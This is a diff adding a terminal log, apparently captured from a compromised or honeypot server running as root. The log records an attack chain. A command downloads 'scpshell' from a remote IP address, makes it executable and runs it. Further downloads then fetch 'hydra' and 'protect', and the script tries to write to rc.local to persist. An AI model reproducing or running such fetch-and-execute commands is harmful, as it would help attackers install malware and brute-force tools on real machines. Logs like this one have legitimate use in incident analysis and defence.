@@ -1,0 +1,37 @@
+<http://103.37.45.58:1432/scpshell&&chmod 777 scpshell&&./scpshell
+--2017-01-20 09:29:19--  http://103.37.45.58:1432/scpshell
+Connecting to 103.37.45.58:1432... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 360 [application/octet-stream]
+Saving to: 'scpshell'
+
+100%[======================================>] 360         --.-K/s   in 0s
+
+2017-01-20 09:29:20 (56.9 MB/s) - 'scpshell' saved [360/360]
+
+iptables: unrecognized service
+--2017-01-20 09:29:20--  http://103.37.45.58:1432//hydra
+Connecting to 103.37.45.58:1432... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1223123 (1.2M) [application/octet-stream]
+Saving to: 'hydra'
+
+100%[======================================>] 1,223,123    241KB/s   in 5.7s
+
+2017-01-20 09:29:26 (208 KB/s) - 'hydra' saved [1223123/1223123]
+
+--2017-01-20 09:29:26--  http://103.37.45.58:1432/protect
+Connecting to 103.37.45.58:1432... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 164 [application/octet-stream]
+Saving to: 'protect'
+
+100%[======================================>] 164         --.-K/s   in 0s
+
+2017-01-20 09:29:26 (4.48 MB/s) - 'protect' saved [164/164]
+
+nohup: ignoring input and appending output to 'nohup.out'
+./scpshell: 13: ./scpshell: cannot create /etc/rc.d/rc.local: Directory nonexistent
+./scpshell: 14: ./scpshell: cannot create /etc/rc.d/rc.local: Directory nonexistent
+./scpshell: 15: ./scpshell: cannot create /etc/rc.d/rc.local: Directory nonexistent
+root@aws:/etc# nohup: appending output to 'nohup.out'
